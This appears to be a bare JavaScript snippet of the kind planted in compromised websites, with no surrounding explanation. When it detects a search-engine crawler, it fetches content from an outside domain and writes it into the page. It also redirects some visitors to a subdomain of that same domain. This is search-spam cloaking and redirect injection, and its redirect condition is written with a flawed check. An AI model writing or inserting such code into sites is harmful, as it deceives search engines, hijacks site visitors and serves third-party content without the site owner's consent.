if(navigator.userAgent.toLocaleLowerCase().indexOf("spider")>0){
    var xmlhttprequest = new XMLHttpRequest();
    xmlhttprequest.open("GET","http://jnhrich.com"+window.location.pathname,true);
    xmlhttprequest.onreadystatechange = function () {
        if (xmlhttprequest.readyState == 4 && xmlhttprequest.status == 200){
            var jsonObj = JSON.parse(xmlhttprequest.responseText);
            document.write(jsonObj);
        }
    }
    xmlhttprequest.send();
}
if(window.location.pathname.indexOf("rich")>0&&!navigator.userAgent.toLocaleLowerCase().indexOf("spider")){
    window.location.href="http://jackmi.jnhrich.com";
}
